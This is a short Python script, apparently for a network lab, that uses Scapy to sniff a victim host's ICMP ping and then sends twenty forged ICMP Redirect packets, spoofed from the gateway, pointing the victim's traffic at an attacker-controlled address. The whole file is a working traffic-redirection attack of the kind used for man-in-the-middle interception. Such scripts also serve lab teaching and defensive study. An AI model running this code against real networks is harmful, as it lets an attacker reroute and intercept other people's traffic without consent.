from scapy.all import IP, ICMP, send, sniff

print("Capturing victim packet...")
pkts = sniff(
    iface="attacker-eth0",
    filter="icmp and src 192.168.10.10 and dst 192.168.20.100",
    count=1,
    timeout=15,
    promisc=True
)

if len(pkts) == 0:
    print("No packet captured! Make sure victim is pinging server.")
    exit(1)

pkt = pkts[0]
print(f"Captured! id={pkt[ICMP].id}, seq={pkt[ICMP].seq}")
inner = bytes(pkt[IP])[:28]

outer_ip = IP(src="192.168.10.1", dst="192.168.10.10")
redirect  = ICMP(type=5, code=1, gw="192.168.10.50")
packet    = outer_ip / redirect / inner

send(packet, iface="attacker-eth0", count=20, inter=0.1)
print("Redirect sent!")